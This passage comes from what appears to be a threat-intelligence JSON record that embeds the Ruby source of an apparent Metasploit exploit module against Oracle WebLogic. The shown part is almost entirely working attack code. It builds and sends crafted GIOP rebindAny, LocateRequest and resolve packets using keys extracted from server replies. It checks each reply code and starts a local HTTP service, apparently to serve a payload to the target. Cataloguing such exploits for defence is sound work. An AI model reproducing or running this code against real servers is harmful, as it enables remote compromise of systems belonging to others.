Then subtract length of the LENGTH_REPLACE_ME string.\n    # 3. Then add 4 to account for the 4 bytes that will now be occupied by the length field.\n    message_size = packet.length - ('LENGTH_REPLACE_ME'.length + 12) + 4\n    packet.gsub!('LENGTH_REPLACE_ME', [message_size].pack('N'))\n\n    print_status('3. Sending rebindAny request!')\n    socket.put(packet)\n    rebind_any_buf = socket.get\n    disconnect\n    print_good('Step 3 complete!')\n\n    reply_status_code = rebind_any_buf[16..19].unpack('N')&.dig(0)\n    if reply_status_code != LOCATION_FORWARD\n      fail_with(Failure::UnexpectedReply, \"Target responded with #{reply_status_code}! Expected LOCATION_FORWARD!\")\n    end\n\n    start_off = 0x64 + lt + 0xc0 + datastore['RHOST'].length + # SendingContextRuntime\n                0xac + lt + # IOR ProfileHost ProfilePort\n                0x5d # ObjectKey Prefix\n\n    while rebind_any_buf[start_off] != 0x32\n      if start_off > 0x2710\n        break\n      end\n\n      start_off += 1\n    end\n\n    if start_off > 0x2710\n      key3 = \"\\x32\\x38\\x39\\x00\"\n    else\n      key3 = rebind_any_buf[start_off...start_off + 4]\n    end\n\n    wls_key_2.gsub!('{{key3}}', key3)\n    wls_key_2.gsub!('{{key1}}', key1)\n\n    # Step 4 - rebind_any Request Again???\n    socket = connect\n    key_addr = wls_key_2\n    packet = giop_rebind_any_packet(SYNCSCOPE_WITH_TARGET, ADDR_DISPOSITION_KEYADDR, key_addr, stub_data, 4)\n\n    context_data = ''\n    context_data << @service_context_0\n    context_data << @service_context_1\n    context_data << create_service_context(\"\\x42\\x45\\x41\", 3, \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + key2 + \"\\x00\\x00\\x00\\x00\")\n    context_data << @service_context_2\n\n    packet.gsub!('{SERVICE_CONTEXT_LIST}', context_data)\n\n    # To find the true message size:\n    # 1. Subtract an extra 12 bytes for GIOP header.\n    # 2. Then subtract length of the LENGTH_REPLACE_ME string.\n    # 3. Then add 4 to account for the 4 bytes that will now be occupied by the length field.\n    message_size = packet.length - ('LENGTH_REPLACE_ME'.length + 12) + 4\n    packet.gsub!('LENGTH_REPLACE_ME', [message_size].pack('N'))\n\n    print_status('4. Sending second rebindAny request!')\n    socket.put(packet)\n    rebind_any_buf_2 = socket.get\n    disconnect\n    print_good('Step 4 complete!')\n\n    reply_status_code = rebind_any_buf_2[16..19].unpack('N')&.dig(0)\n    if reply_status_code != NO_EXCEPTION\n      fail_with(Failure::UnexpectedReply, \"Target responded with #{reply_status_code}! Expected NO_EXCEPTION!\")\n    end\n\n    # Step 5 - Send second GIOP LocateRequest packet\n    print_status('5. Sending second GIOP LocateRequest packet')\n    socket = connect\n    socket.put(giop_locate_request_packet)\n    locate_buf_two = socket.get\n    disconnect\n    print_good('Step 5 complete!')\n\n    reply_status_code = locate_buf_two[16..19].unpack('N')&.dig(0)\n    if reply_status_code != OBJECT_FORWARD\n      fail_with(Failure::UnexpectedReply, \"Target responded with #{reply_status_code}! Expected OBJECT_FORWARD!\")\n    end\n\n    # Step 6 - Resolve packet #1 with wls_key_1\n    key_addr = wls_key_1\n    packet = goip_resolve_request_packet(SYNCSCOPE_WITH_TARGET, ADDR_DISPOSITION_KEYADDR, key_addr, 4, true, 1)\n\n    context_data = ''\n    context_data << @service_context_0\n    context_data << @service_context_1\n    context_data << create_service_context(\"\\x42\\x45\\x41\", 3, \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + key2 + \"\\x00\\x00\\x00\\x00\")\n    context_data << @service_context_2\n\n    packet.gsub!('{SERVICE_CONTEXT_LIST}', context_data)\n\n    # To find the true message size:\n    # 1. Subtract an extra 12 bytes for GIOP header.\n    # 2. Then subtract length of the LENGTH_REPLACE_ME string.\n    # 3. Then add 4 to account for the 4 bytes that will now be occupied by the length field.\n    message_size = packet.length - ('LENGTH_REPLACE_ME'.length + 12) + 4\n    packet.gsub!('LENGTH_REPLACE_ME', [message_size].pack('N'))\n\n    print_status('6. Sending resolve packet #1 with wls_key_1')\n    socket = connect\n    socket.put(packet)\n    resolve_packet_wls_key_1 = socket.get\n    disconnect\n    print_good('Step 6 complete!')\n\n    reply_status_code = resolve_packet_wls_key_1[16..19].unpack('N')&.dig(0)\n    if reply_status_code != LOCATION_FORWARD\n      fail_with(Failure::UnexpectedReply, \"Target responded with #{reply_status_code}! Expected LOCATION_FORWARD!\")\n    end\n\n    # Step 7 - Resolve packet #2 with wls_key_2\n    key_addr = wls_key_2\n    packet = goip_resolve_request_packet(SYNCSCOPE_WITH_TARGET, ADDR_DISPOSITION_KEYADDR, key_addr, 4, true, 1)\n\n    context_data = ''\n    context_data << @service_context_0\n    context_data << @service_context_1\n    context_data << create_service_context(\"\\x42\\x45\\x41\", 3, \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + key2 + \"\\x00\\x00\\x00\\x00\")\n    context_data << @service_context_2\n\n    packet.gsub!('{SERVICE_CONTEXT_LIST}', context_data)\n\n    # To find the true message size:\n    # 1. Subtract an extra 12 bytes for GIOP header.\n    # 2. Then subtract length of the LENGTH_REPLACE_ME string.\n    # 3. Then add 4 to account for the 4 bytes that will now be occupied by the length field.\n    message_size = packet.length - ('LENGTH_REPLACE_ME'.length + 12) + 4\n    packet.gsub!('LENGTH_REPLACE_ME', [message_size].pack('N'))\n\n    start_service\n    start_http_service('ServerPort' => datastore['HTTP_SRVPORT'].to_i)\n\n    print_status('7. Sending resolve packet #2 with wls_key_2')\n    socket = connect\n    socket.put(packet)\n    step_7_response = socket.get\n    disconnect\n    print_good('Step 7 complete!')\n\n    reply_status_code = step_7_response[16..19].unpack('N')&.dig(0)\n    if reply_status_code != USER_EXCEPTION\n      fail_with(Failure::UnexpectedReply, \"Target responded with #{reply_status_code}! Expected USER_EXCEPTION!\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-01-17",
    "x_mitre_platforms": [
        "%w[unix linux]"
    ]
}